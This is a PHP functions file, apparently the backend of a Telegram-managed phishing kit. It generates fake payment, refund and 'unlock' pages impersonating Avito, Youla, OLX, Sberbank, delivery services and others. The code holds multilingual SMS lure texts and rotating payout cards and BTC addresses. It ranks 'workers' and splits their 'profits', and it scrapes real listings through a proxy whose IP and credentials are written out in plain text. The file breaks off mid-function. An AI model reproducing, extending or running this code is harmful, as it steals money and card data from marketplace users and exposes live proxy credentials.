<?php
	error_reporting(0);
	date_default_timezone_set('Europe/Moscow');

	include '_config.php';

	function loadSite() {
		header('Location: https://www.wikipedia.org/');
		exit();
	}
	
	
	function Proxy($a) {
        return [
            1 => ['45.139.52.60:58801', 'JivvugCw:aVFiAHkZ'], 
            2 => ['45.139.52.60:58801', 'JivvugCw:aVFiAHkZ'], 
            3 => ['45.139.52.60:58801', 'JivvugCw:aVFiAHkZ'], 
        ][$a];
    }

	function baloutMin() {
		return 500;
	}

	function smsTexts() {
		return [
			'Ссылка для оплаты товара: %url%',
			'Ссылка для возврата средств: %url%',
			'Ваш товар оплачен. Получите деньги по ссылке: %url%',
			'Для возврата средств перейдите по ссылке: %url%',
			'Ссылка для безопасной сделки: %url%',
		];
	}
	
	function smsTextsPL() {
  return [
   'Link do zapłaty za przedmiot: %url%',
   'Link do zwrotu pieniędzy: %url%',
   'Za Twój przedmiot zapłacono. Zdobądź pieniądze z linku: %url%',
   'Aby uzyskać zwrot pieniędzy, kliknij łącze: %url%',
   'Link do bezpiecznej transakcji: %url%',
  ];
 }

	    	function smsTextsRO() {
		return [
			'Link pentru plata bunurilor: %url%',
			'Link de rambursare: %url%',
			'Articolul dvs. a fost achitat. Obțineți bani de pe linkul: %url%',
			'Pentru a rambursa fonduri prin link: %url%',
			'Link pentru operare sigură: %url%',
		];
	}
	
	
	function smsTextsCZ() {
		return [
			'Odkaz na platbě za zboží: %url%',
			'Refund link: %url%',
			'Vaše položka byla zaplacena. Získejte peníze z odkazu: %url%',
			'Pro vrácení peněz použijte odkaz: %url%',
			'Link for safe deal: %url%',
		];
	}

	function paymentProxy($n) {
		return allProxy()[$n];
	}
	
	function host() {
		return 'https://'.$_SERVER['SERVER_NAME'].'/';
	}
	
	function amountMax() {
		return intval(fileRead(dirSettings('amax')));
	}
	
	function amountMin() {
		return intval(fileRead(dirSettings('amin')));
	}

	function referalRate() {
		return intval(fileRead(dirSettings('refr')));;
	}

	function paymentName() {
		return [
			0 => '',
		//	1 => 'mts',
		//	2 => 'open',
			//3 => 'psb',
		//	4 => 'usb',
		//   6 => 'open',
         //   7 => 'svy',
        //    8 => 'min',
		][getPaymentName()];
	}

	function paymentTitle($v) {
		return [
			0 => 'Ручная',
		//	1 => 'МТС',
			//2 => 'Open',
			//3 => 'ПСБ',
		//	4 => 'Уралсиб',
		//	5 => 'Мегафон',
         //   6 => 'Open',
         //   7 => 'Связной',
          //  8 => 'Минбанк',
		][$v];
	}

	function getDomains($a) {
		return allDomains()[$a];
	}

	function getDomain($a, $b = 0) {
		return getDomains(intval($a))[$b];
	}

	function getFakePage($a, $b = 0) {
		return [
			1 => ['merchant', 'order', 'refund', 'buy', 'cash', 'unlock'],
			2 => ['merchant', 'track', 'refund', 'cash', 'unlock'],
			3 => ['merchant', 'rent', 'refund', 'cash'],
			4 => ['merchant', 'cars', 'refund', 'cash'], //cars
		][$a][intval($b)];
	}

	function getFakeRedir($dom, $item, $isnr) {
		return 'https://'.$dom.'/'.(['merchant', 'refund', 'unlock'][$isnr]).$item;
	}
	
	function getFakeUrl($id, $item, $a, $b = 0) {
		return ($id ? 'https://'.getUserDomainName($id, $a).'/' : '').getFakePage(in_array($a, [1, 2, 8, 9, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37]) ? ($a == 19 ? 4 : ($a == 9 || $a == 12 ?  3 : 1)) : 2, $b).$item;
	}
	
	
	function getService($a, $b = false, $c = false) {
		$t = [
1 => 'Авито',
2 => 'Юла',
3 => 'Боксберри',
4 => 'СДЭК',
5 => 'Почта РФ',
6 => 'ПЭК',
7 => 'Яндекс',
8 => 'Avito Недвижимость',
9 => 'Youla Недвижимость',
10 => 'Gumtree',
11 => 'OLX KZ',
12 => 'Достависта',
13 => 'Сбербанк',
14 => 'Альфа-Банк',
15 => 'AUTO RU',
16 => 'OLX Argentina',
17 => 'Booking',
18 => 'Яндекс Объявления',
19 => 'БлаБлаКар',
20 => 'Циан',
21 => 'КазПочта',
22 => 'Куфар',
23 => 'BelPost',
24 => 'Fargo uz',
25 => 'OLX UZ',
26 => 'OLX RO',
27 => 'OLX KZ недвижимость',
28 => 'M.Video',
29 => 'OLX PL',
30 => 'OLX UA',
31 => 'СБАЗАР',
32 => 'IZI ua',
33 => 'Allegro',
34 => 'Европочта',
35 => 'OLX BG',
36 => 'FAN Courier',
37 => 'Bazos',
		][intval($a)];
		if ($c)
			$t .= ' 2.0';
		if (!$b)
			return $t;
		return $t.' - '.[
			1 => 'Оплата',
			2 => 'Возврат',
			3 => 'Безоп. сделка',
			4 => 'Получ. средств',
		][intval($b)];
	}
	
	function trackStatus($a) {
		return [
			1 => 'Ожидает оплаты',
			2 => 'Оплачен',
			3 => 'Возврат средств',
			4 => 'Получение средств',
		][intval($a)];
	}

	function getShopName($srvc, $isnr) {
		return [
			1 => ['Avito.Pokupka', 'Avito vozvrat deneg', 'Avito poluchenie deneg'],
			2 => ['Youla.Pokupka', 'Youla vozvrat deneg', 'Youla poluchenie deneg'],
			3 => ['Boxberry oplata', 'Boxberry vozvrat deneg', 'Boxberry poluchenie deneg'],
			4 => ['CDEK oplata', 'CDEK vozvrat deneg', 'CDEK poluchenie deneg'],
			5 => ['Pochta oplata', 'Pochta vozvrat deneg', 'Pochta poluchenie deneg'],
			6 => ['PECOM oplata', 'PECOM vozvrat deneg', 'PECOM poluchenie deneg'],
			7 => ['Yandex oplata', 'Yandex vozvrat deneg', 'Yandex poluchenie deneg'],
			8 => ['Avito.oplata', 'Avito vozvrat deneg', 'Avito poluchenie deneg'],
			9 => ['Youla.oplata', 'Youla vozvrat deneg', 'Youla poluchenie deneg'],
			11 => ['OLX.oplata', 'OLX vozvrat deneg', 'OLX poluchenie deneg'],
			12 => ['Dostavista.oplata', 'Dostavista vozvrat deneg', 'Dostavista poluchenie deneg'],
			13 => ['Sberbank.oplata', 'Sberbank zachislenie deneg', 'Sberbank poluchenie deneg'],
			14 => ['nrg-tk.oplata', 'Alfa zachislenie deneg', 'nrg-tk poluchenie deneg'],
			15 => ['Auto.oplata', 'Auto vozvrat deneg', 'Auto poluchenie deneg'],
			16 => ['OLX.oplata', 'OLX vozvrat deneg', 'OLX poluchenie deneg'],
			17 => ['Booking.oplata', 'Booking vozvrat deneg', 'Booking poluchenie deneg'],
			18 => ['Yandex.oplata', 'Yandex vozvrat deneg', 'Yandex poluchenie deneg'],
			19 => ['blablacar.oplata', 'blablacar vozvrat deneg', 'blablacar poluchenie deneg'],
			20 => ['Cian.oplata', 'Cian vozvrat deneg', 'Cian poluchenie deneg'],
			21 => ['post.kz.oplata', 'post.kz vozvrat deneg', 'post.kz poluchenie deneg'],
			22 => ['Kufar.oplata', 'Kufar vozvrat deneg', 'Kufar poluchenie deneg'],
			23 => ['Belpost.oplata', 'Belpost vozvrat deneg', 'Belpost poluchenie deneg'],
			24 => ['Fargo oplata', 'Fargo vozvrat deneg', 'Fargo poluchenie deneg'],
			25 => ['OLX.oplata', 'OLX vozvrat deneg', 'OLX poluchenie deneg'],
			26 => ['OLX.ro', 'OLX.ro', 'OLX.ro '],
			27 => ['OLX.oplata', 'OLX vozvrat deneg', 'OLX poluchenie deneg'],
			28 => ['M.Video oplata', 'M.Video vozvrat deneg', 'M.Video poluchenie deneg'],
			29 => ['Olx.Dostawa', 'Olx zwrot', 'Olx otrzymanie pieniędzy'],
			30 => ['OLX.ua', 'OLX.ua', 'OLX.ua'],
			31 => ['sbazar.cz', 'sbazar.cz', 'sbazar.cz'],
			32 => ['IZI.oplata', 'IZI vozvrat deneg', 'IZI poluchenie deneg'],
			33 => ['Allegro Dostawa', 'Allegro zwrot', 'Allegro otrzymanie pieniędzy'],
			34 => ['EvroPost oplata', 'EvroPost vozvrat deneg', 'EvroPost poluchenie deneg'],
			35 => ['OLX покупка', 'OLX възстановяване', 'OLX олучаване на пари'],
			36 => ['FAN Courier', 'FAN Courier', 'FAN Courier'],
			
		][$srvc][$isnr];
	}

	function userStatusName($a) {
		return [
			0 => 'Без статуса',
			1 => 'Заблокирован',
			2 => 'Воркер',
			3 => 'ТОП воркер',
			4 => 'Модератор',
			5 => 'Администратор',
			6 => 'ТС',
		][$a];
	}
	
	function isAutoCard() {
		return (fileRead(dirSettings('acard')) == '1');
	}

	function toggleAutoCard() {
		$t = isAutoCard();
		fileWrite(dirSettings('acard'), $t ? '' : '1');
		return !$t;
	}

	function isAutoPayment() {
		return (fileRead(dirSettings('apaym')) == '1');
	}

	function toggleAutoPayment() {
		$t = isAutoPayment();
		fileWrite(dirSettings('apaym'), $t ? '' : '1');
		return !$t;
	}

	function addCardBalance($n, $v) {
		$t = getCards();
		$res = [];
		for ($i = 0; $i < count($t); $i++) {
			$t1 = explode(':', $t[$i]);
			if ($t1[0] == $n)
				$t1[1] = intval($t1[1]) + $v;
			$res[] = implode(':', $t1);
		}
		setCard($res);
	}

	function getCards() {
		$t = fileRead(dirSettings('card'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardData() {
		return explode(':', getCards()[0]);
	}
	
	function getCard() {
		return getCardData()[0];
	}

	function getCardBalance() {
		return intval(getCardData()[1]);
	}

	function setNextCard() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCards();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndex($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCard($n) {
		$t = getCards();
		if (cardIndex($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCard($t);
	}

	function delCard($n) {
		$t = getCards();
		$t1 = cardIndex($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCard($t);
	}
	
	function setCard($v) {
		return fileWrite(dirSettings('card'), implode('`', $v));
	}

	function getCard2() {
		return explode('`', fileRead(dirSettings('card2')));
	}
	
	function setCard2($n, $j) {
		return fileWrite(dirSettings('card2'), implode('`', [$n, $j]));
	}

	function getCardBtc() {
		return fileRead(dirSettings('cbtc'));
	}
	
	function setCardBtc($n) {
		return fileWrite(dirSettings('cbtc'), $n);
	}

	function getPaymentName() {
		return intval(fileRead(dirSettings('pay')));
	}
	
	function setPaymentName($n) {
		fileWrite(dirSettings('pay'), $n);
	}

	function getPayXRate() {
		return intval(fileRead(dirSettings('payx')));
	}

	function setPayXRate($a) {
		fileWrite(dirSettings('payx'), $a);
	}
	
	function fixAmount($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function getUserDomainName($id, $a) {
		return getDomain($a, getUserDomain($id, $a));
	}
	
	function dirUsers($id, $n = false) {
		return 'users/'.$id.($n ? '/'.$n.'.txt' : '');
	}
	
	function isnt_t($isnt) {
		if ($isnt == 1) return 'items';
		elseif ($isnt == 2) return 'rent';
		elseif ($isnt == 3) return 'cars'; //cars
		elseif (!$isnt) return 'tracks';
	}
	
	function dirItems($n, $isnt) {
		return ($isnt ? 'items' : 'tracks').'/'.$n.'.txt';
	}
	
	function dirStats($n) {
		return 'stats/'.$n.'.txt';
	}
	
	function dirSettings($n) {
		return 'settings/'.$n.'.txt';
	}
	
	function dirBin($n) {
		return 'bin/'.$n.'.txt';
	}

	function dirKeys($n) {
		return 'keys/'.$n.'.txt';
	}
	
	function dirIp($n) {
		return 'ip/'.$n.'.txt';
	}
	
	function dirPays($n) {
		return 'pays/'.$n.'.txt';
	}
	
	function dirMails($n) {
		return 'mails/'.$n.'.txt';
	}

	function dirCards($n) {
		return 'cards/'.$n.'.txt';
	}

	function dirChecks($n) {
		return 'checks/'.$n.'.txt';
	}

	function dirPages($n) {
		return 'pages/'.$n.'.txt';
	}

	function dirStyles($n) {
		return 'styles/'.$n.'.txt';
	}

	function dirScripts($n) {
		return 'scripts/'.$n.'.txt';
	}

	function setIpData($ip, $n, $v) {
		fileWrite(dirIp($n.'_'.str_replace(':', ';', $ip)), $v);
	}

	function getIpData($ip, $n) {
		return fileRead(dirIp($n.'_'.str_replace(':', ';', $ip)));
	}

	function setCardData($a, $b, $c, $d) {
		fileWrite(dirCards($a.'-'.$b.'-'.$c.'-'.$d), time());
	}

	function isCardData($a, $b, $c, $d) {
		return (time() - intval(fileRead(dirCards($a.'-'.$b.'-'.$c.'-'.$d))) < 10);
	}

	function setCookieData($n, $v, &$cc) {
		$cc[md5($n)] = base64_encode($v);
	}

	function getCookieData($n, $cc) {
		return base64_decode($cc[md5($n)]);
	}

	include 'functions/lastalert.php';
/*	function getLastAlert() {
		return fileRead(dirSettings('alert'));
	}
	
	function setLastAlert($n) {
		return fileWrite(dirSettings('alert'), $n);
	}*/

	function isItem($item, $isnt) {
		return file_exists(dirItems($item, $isnt));
	}
	
	function delItem($item, $isnt) {
		fileDel(dirItems($item, $isnt));
	}
	
	function addItem($v, $isnt) {
		$item = 0;
		while (true) {
			$item = rand(10000000, 99999999);
			if (!isItem($item, $isnt))
				break;
		}
		fileWrite(dirItems($item, $isnt), implode('`', $v));
		return $item;
	}
	
	function getItemData($item, $isnt) {
		$t = explode('`', fileRead(dirItems($item, $isnt)));
		$t[0] = intval($t[0]);
		$t[1] = intval($t[1]);
		$t[2] = intval($t[2]);
		$t[4] = intval($t[4]);
		$t[5] = intval($t[5]);
		return $t;
	}
	
	function setItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function addItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = intval($t[$n]) + $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function getUserItems($id, $isnt) {
		$t = getUserData($id, $isnt ? 'items' : 'tracks');
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserItems($id, $items, $isnt) {
		setUserData($id, $isnt ? 'items' : 'tracks', implode('`', $items));
	}

	function getUserDomains($id) {
		$doms = explode('`', getUserData($id, 'doms'));
		$c = 14 - count($doms);
		if ($c > 0)
			for ($i = 0; $i < $c; $i++)
				$doms[] = '';
		return $doms;
	}

	function getUserDomain($id, $srvc) {
		return intval(getUserDomains($id)[intval($srvc) - 1]);
	}

	function setUserDomain($id, $srvc, $n) {
		$doms = getUserDomains($id);
		$doms[$srvc - 1] = ($n === 0 ? '' : $n);
		setUserData($id, 'doms', implode('`', $doms));
	}
	
	function isUserAnon($id) {
		return (getUserData($id, 'anon') == '1');
	}
	
	function setUserAnon($id, $v) {
		setUserData($id, 'anon', $v ? '1' : '');
	}
	
	function getUserReferal($id) {
		$referal = getUserData($id, 'referal');
		if (isUserBanned($referal))
			return false;
		return $referal;
	}
	
	function setUserReferal($id, $v) {
		if (isUserBanned($v))
			return;
		setUserData($id, 'referal', $v);
	}
	
	function getUserReferalName($id, $a = false, $b = false) {
		$t = getUserReferal($id);
		return ($t ? userLogin($t, $a, $b) : 'Никто');
	}
	
	function delUserItem($id, $item, $isnt) {
		delItem($item, $isnt);
		$items = getUserItems($id, $isnt);
		if (!in_array($item, $items))
			return;
		unset($items[array_search($item, $items)]);
		setUserItems($id, $items, $isnt);
	}
	
	function addUserItem($id, $v, $isnt) {
		$item = addItem($v, $isnt);
		$items = getUserItems($id, $isnt);
		if (in_array($item, $items))
			return 0;
		$items[] = $item;
		setUserItems($id, $items, $isnt);
		return $item;
	}
	
	function isUserItem($id, $item, $isnt) {
		$items = getUserItems($id, $isnt);
		return in_array($item, $items);
	}

	function getUserChecks($id) {
		$t = getUserData($id, 'checks');
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserChecks($id, $checks) {
		setUserData($id, 'checks', implode('`', $checks));
	}

	function urlCheck($check) {
		return 'https://t.me/'.botLogin().'?start=c_'.$check;
	}

	function isCheck($check) {
		return file_exists(dirChecks($check));
	}
	
	function get_currency($currency_code, $format) {

	$date = date('d/m/Y'); // Текущая дата
	$cache_time_out = '3600'; // Время жизни кэша в секундах

	$file_currency_cache = __DIR__.'/XML_daily.asp';

	if(!is_file($file_currency_cache) || filemtime($file_currency_cache) < (time() - $cache_time_out)) {

		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, 'https://www.cbr.ru/scripts/XML_daily.asp?date_req='.$date);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch, CURLOPT_HEADER, 0);

		$out = curl_exec($ch);

		curl_close($ch);

		file_put_contents($file_currency_cache, $out);

	}

	$content_currency = simplexml_load_file($file_currency_cache);

	return number_format(str_replace(',', '.', $content_currency->xpath('Valute[CharCode="'.$currency_code.'"]')[0]->Value), $format);

}
	
	function delCheck($check) {
		fileDel(dirChecks($check));
	}
	
	function addCheck($v) {
		$check = 0;
		while (true) {
			$check = bin2hex(random_bytes(16));
			if (!isCheck($check))
				break;
		}
		fileWrite(dirChecks($check), implode('`', $v));
		return $check;
	}
	
	function getCheckData($check) {
		$t = explode('`', fileRead(dirChecks($check)));
		$t[0] = intval($t[0]);
		return $t;
	}

	function delUserCheck($id, $check) {
		delCheck($check);
		$checks = getUserChecks($id);
		if (!in_array($check, $checks))
			return;
		unset($checks[array_search($check, $checks)]);
		setUserChecks($id, $checks);
	}

	function addUserCheck($id, $v) {
		$check = addCheck($v);
		$checks = getUserChecks($id);
		if (in_array($check, $checks))
			return 0;
		$checks[] = $check;
		setUserChecks($id, $checks);
		return $check;
	}
	
	function isUserCheck($id, $check) {
		$checks = getUserChecks($id);
		return in_array($check, $checks);
	}
	
	function getRate($id = false) {
		$t = explode('`', fileRead(dirSettings('rate')));
		$prc1 = intval($t[0]);
		$prc2 = intval($t[1]);
		if ($id) {
			$t = explode('`', getUserData($id, 'rate'));
			$t1 = intval($t[0]);
			$t2 = intval($t[1]);
			if ($t1 > 0)
				$prc1 = $t1;
			if ($t2 > 0)
				$prc2 = $t2;
		}
		return [$prc1, $prc2];
	}

	function setRate($a, $b) {
		fileWrite(dirSettings('rate'), $a.'`'.$b);
	}

	function setUserRate($id, $a, $b) {
		setUserData($id, 'rate', $a.'`'.$b);
	}

	function delUserRate($id) {
		setUserData($id, 'rate', '');
	}

	function setAmountLimit($a, $b) {
		fileWrite(dirSettings('amin'), $a);
		fileWrite(dirSettings('amax'), $b);
	}

	function setReferalRate($a) {
		fileWrite(dirSettings('refr'), $a);
	}

	function setUserData($id, $n, $v) {
		$t = dirUsers($id, $n);
		if ($v == '') {
			if (file_exists($t))
				fileDel($t);
		} else
			fileWrite($t, $v);
	}
	
	function getUserData($id, $n) {
		return fileRead(dirUsers($id, $n));
	}
	
	function setInput($id, $v) {
		setUserData($id, 'input', $v);
	}
	
	function getInput($id) {
		return getUserData($id, 'input');
	}
	
	function setUserBalance($id, $v) {
		setUserData($id, 'balance', $v);
	}
	
	function getUserBalance($id) {
		return intval(getUserData($id, 'balance'));
	}
	
	function addUserBalance($id, $v) {
		setUserBalance($id, intval(getUserBalance($id) + $v));
	}

	function setUserBalance2($id, $v) {
		setUserData($id, 'balance2', $v);
	}
	
	function getUserBalance2($id) {
		return intval(getUserData($id, 'balance2'));
	}
	
	function addUserBalance2($id, $v) {
		setUserBalance2($id, intval(getUserBalance2($id) + $v));
	}
	
	function setUserBalanceOut($id, $v) {
		setUserData($id, 'balanceout', $v);
	}
	
	function getUserBalanceOut($id) {
		return intval(getUserData($id, 'balanceout'));
	}
	
	function getUserHistory($id) {
		$t = getUserData($id, 'history');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserHistory($id, $v) {
		$t = getUserHistory($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'history', implode('`', $t));
	}

	function getUserProfits($id) {
		$t = getUserData($id, 'profits');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserProfits($id, $v) {
		$t = getUserProfits($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profits', implode('`', $t));
	}

	function getUserRefs($id) {
		return intval(getUserData($id, 'refs'));
	}
	
	function addUserRefs($id) {
		setUserData($id, 'refs', intval(getUserRefs($id) + 1));
	}

	function getUserRefbal($id) {
		return intval(getUserData($id, 'refbal'));
	}
	
	function addUserRefbal($id, $v) {
		setUserData($id, 'refbal', intval(getUserRefbal($id) + $v));
	}
	
	function setInputData($id, $n, $v) {
		setUserData($id, 't/_'.$n, $v);
	}
	
	function getInputData($id, $n) {
		return getUserData($id, 't/_'.$n);
	}
	
	function setUserStatus($id, $v) {
		setUserData($id, 'status', $v);
	}
	
	function getUserStatus($id) {
		return intval(getUserData($id, 'status'));
	}
	
	function getUserStatusName($id) {
		return userStatusName(getUserStatus($id));
	}
	
	function isUserAccepted($id) {
		return (intval(getUserData($id, 'joined')) > 0);
	}
	
	function isUser($id) {
		return is_dir(dirUsers($id));
	}
	
	function isUserBanned($id) {
		return (getUserStatus($id) == 1);
	}
	
	function canUserUseSms($id) {
		$accessms = accessSms();
		$profit = getUserProfit($id);
		return (getUserStatus($id) > 4 || userJoined($id) >= $accessms[0] || $profit[1] >= $accessms[1]);
	}

	function getUserProfit($id) {
		$t = getUserData($id, 'profit');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}
	
	function addUserProfit($id, $amount, $rate) {
		$profit = getUserProfit($id);
		setUserData($id, 'profit', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfits($id, [time(), $amount]);
		return [$amount, $amount0];
	}
	
	function getProfit() {
		$t = explode('`', fileRead(dirStats('profit')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0() {
		$t = explode('`', fileRead(dirStats('profit_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}
	
	function addProfit($v, $m) {
		$t = getProfit();
		fileWrite(dirStats('profit'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0();
		fileWrite(dirStats('profit_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function urlReferal($v) {
		return 'https://t.me/'.botLogin().'?start=r_'.$v;
	}
	
	function regUser($id, $login, $accept = false) {
		if ($accept) {
			setUserData($id, 'joined', time());
			setUserStatus($id, 2);
			return true;
		} else {
			if (!isUser($id)) {
				mkdir(dirUsers($id));
				mkdir(dirUsers($id).'/t');
				setUserData($id, 'login', $login);
				return true;
			}
		}
		return false;
	}
	
	function updLogin($id, $login) {
		$t = getUserData($id, 'login');
		if (strval($t) == strval($login))
			return false;
		setUserData($id, 'login', $login);
		return true;
	}
	
	function userJoined($id) {
		return intval((time() - intval(getUserData($id, 'joined'))) / 86400);
	}
	
	function userLogin($id, $shid = false, $shtag = false) {
		$login = getUserData($id, 'login');
		return ($shtag ? getUserStatusName($id).' ' : '').'<a href="tg://user?id='.$id.'">'.($login ? $login : 'Без ника').'</a>'.($shid ? ' ['.$id.']' : '');
	}

	function userLogin2($id) {
		return (isUserAnon($id) ? 'Скрыт' : userLogin($id));
	}
	
	function makeProfit($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfit($id, $amount, $rate);
		addProfit($amount, $t[0] + $t[1]);
		return $t;
	}
	
	function createBalout($id) {
		$balance = getUserBalance($id);
		setUserBalance($id, 0);
		setUserBalanceOut($id, $balance);
		return $balance;
	}
	
	function makeBalout($id, $dt, $balout, $url) {
		setUserBalanceOut($id, 0);
		addUserHistory($id, [$dt, $balout, $url]);
		return true;
	}
	
	
	include 'functions/request.php';
	function request($url, $post = false, $rh = false, $proxy = []) {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        if ($rh)
            curl_setopt($curl, CURLOPT_HEADER, true);
        if ($post) {
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
        }
        if(isset($proxy[0])) {
                curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
            if(isset($proxy[1])) {
                curl_setopt($curl, CURLOPT_PROXYUSERPWD, $proxy[1]);
                curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            }
        }
        $result = curl_exec($curl);
        curl_close($curl);
        return $result;
    }

	function ruchkaStatus($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remote.php', $post);
	}
	
	function botSend($msg, $id = false, $kb = false) {
		if (!$id)
			return false;
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		return json_decode(request(botUrl('sendMessage'), $post), true)['ok'];
	}
	$country = $keyc;
	function botEdit($msg, $mid, $id, $kb = false) {
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'message_id' => $mid,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		request(botUrl('editMessageText'), $post);
	}

	function botKick($id, $chat) {
		$post = [
			'chat_id' => $chat,
			'user_id' => $id,
		];
		return json_decode(request(botUrl('kickChatMember'), $post), true)['ok'];
	}
	
	function botDelete($mid, $id) {
		$post = [
			'chat_id' => $id,
			'message_id' => $mid,
		];
		request(botUrl('deleteMessage'), $post);
	}
	
	function botKeybd($v) {
		if ($v[0])
			return [
				'inline_keyboard' => $v[1]
			];
		else
			return [
				'keyboard' => $v[1],
				'resize_keyboard' => true,
				'one_time_keyboard' => false
			];
	}
	
	function botUrl($n) {
		return 'https://api.telegram.org/bot'.botToken().'/'.$n;
	}
	
	function botUrlFile($n) {
		return 'https://api.telegram.org/file/bot'.botToken().'/'.$n;
	}
	
	function isUrlItem($url, $a) {
  return count(explode('/', explode([
   1 => 'avito.ru',
   2 => 'youla.ru',
   3 => 'olx.pl',
  ][$a], $url, 2)[1])) >= 3; // с 4 на 3
 }
	
	 function pageCut228($s, $s1, $s2) {
        if (strpos($s, $s1) === false || strpos($s, $s2) === false)
            return '';
        return explode($s2, explode($s1, $s, 2)[1], 2)[0];
    }
    $BankName = $bnkm;
        //include 'functions/urlimg.php';
    function isUrlImage($url) {
        $head = mb_strtolower(explode("\r\n\r\n", request($url, false, true, Proxy(3)))[0]);
        $ctype = pageCut228($head, 'content-type: ', "\r\n");
        return in_array($ctype, [
            'image/jpeg',
            'image/png',
            'image/webp',
        ]);
    }
	
	function isEmail($n) {
		$ps = explode('@', $n);
		if (count($ps) != 2)
			return false;
		if (count(explode('.', $ps[1])) < 2)
			return false;
		$l = strlen($ps[0]);
		if ($l < 2 || $l > 64)
			return false;
		$o = '_-.';
		if (strpos($o, $ps[0][0]) !== false || strpos($o, $ps[0][$l - 1]) !== false)
			return false;
		for ($i = 0; $i < strlen($o); $i++)
			for ($j = 0; $j < strlen($o); $j++)
				if (strpos($ps[0], $o[$i].$o[$j]) !== false)
					return false;
		return true;
	}
	
	function fileRead($n) {
		if (!file_exists($n))
			return false;
		$f = fopen($n, 'rb');
		if (flock($f, LOCK_SH)) {
			$v = fread($f, filesize($n));
			fflush($f);
			flock($fp, LOCK_UN);
		}
		fclose($f);
		return $v;
	}
	
	function fileWrite($n, $v, $a = 'w') {
		$f = fopen($n, $a.'b');
		if (flock($f, LOCK_EX)) {
			fwrite($f, $v);
			fflush($f);
			flock($fp, LOCK_UN);
		}
		fclose($f);
		return true;
	}
	
	function fileDel($n) {
		if (file_exists($n))
			return unlink($n);
		return false;
	}
	
		function parseItem($id, $url, $a) {
        if (strpos($url, 'trk.mail.ru') !== false) {
            $url = 'https://youla.ru/'.explode('?', explode('youla.ru/', explode('">', explode('<link rel="canonical" href="', request($url), 2)[1], 2)[0], 2)[1])[0];
            $a = 2;
        } else {
            if ($a == 1)
                $url = 'https://www.avito.ru/'.explode('?', explode('avito.ru/', $url, 2)[1])[0];
            elseif ($a == 2)
                $url = 'https://youla.ru/'.explode('?', explode('youla.ru/', $url, 2)[1])[0];
			elseif ($a == 3)
                $url = 'https://www.olx.pl/'.explode('?', explode('olx.pl/', $url, 2)[1])[0];
        }
        $page = str_replace(["\r", "\n"], '', request($url, false, false, Proxy(3), Proxy(3)));
        if ($page == '')
            return false;
        $itemd = [0, 0, 0, $id, time()];
        if ($a == 1) {
            $itemd[] = pageCut228($page, 'avito.item.price = \'', '\';');
            $itemd[] = trim(pageCut228($page, 'sticky-header-title">', '</div>'));
            $itemd[] = pageCut228($page, 'avito.item.image = \'', '\';');
